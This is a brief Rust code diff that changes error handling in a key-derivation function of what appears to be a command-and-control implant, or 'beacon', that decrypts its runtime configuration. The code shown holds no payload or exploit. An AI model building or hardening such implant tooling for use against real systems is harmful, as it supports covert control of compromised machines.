@@ -299,7 +299,13 @@ fn derive_config_key(implant_priv: &[u8; 32], server_pub: &[u8; 32]) -> Option<[
     info[32..].copy_from_slice(&implant_pub);
 
     let mut okm = [0u8; 32];
-    crypto::hkdf_sha256(&shared, b"nyx-implant-config-v1", &info, &mut okm);
+    // okm is a fixed 32 bytes — far below the 8160-byte HKDF-Expand bound — so
+    // OutputTooLong is structurally unreachable. We surface it as None (a
+    // failed key derivation) rather than panicking; the caller
+    // (load_runtime_config) returns None and the beacon falls back to the
+    // compile-time config. Avoids the panic=abort abort the pre-fix
+    // `.expect()` would have caused.
+    crypto::hkdf_sha256(&shared, b"nyx-implant-config-v1", &info, &mut okm).ok()?;
     Some(okm)
 }
 
